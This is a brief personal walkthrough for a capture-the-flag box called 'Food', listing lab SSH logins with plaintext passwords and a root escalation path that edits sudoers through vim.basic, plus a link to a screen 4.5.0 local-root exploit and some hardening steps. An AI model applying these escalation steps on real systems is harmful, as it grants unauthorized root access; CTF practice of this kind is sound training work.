Food

https://jc01.ninja/ctf/foodctf/ (I will be doing my path to exploit, see this writeup if you want throurough solution)

`ssh food@ip` passwod givemecookies

CHANGE PASSWORD
`/usr/sbin/passwd`

`/bin/su`

`ssh ramen@ip` password noodlesRTheBest

CHANGE PASSWORD

`ssh pasta@ip` password pastaisdynamic

CHANGE PASSWORD

food may be missing path, use `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin`

Exploit:

`vim.basic sudoers` add `USER ALL=(ALL:ALL) ALL` then `sudo su`

Alternative:

https://www.exploit-db.com/exploits/41154

MAKE SURE YOU REMOVE THE SCRIPT AND ROOTFILE AFTER DONE

`chmod 0755 /usr/bin/screen /usr/bin/screen-4.5.0 /usr/bin/vim.basic`
`visudo` --> remove the pwfeedback
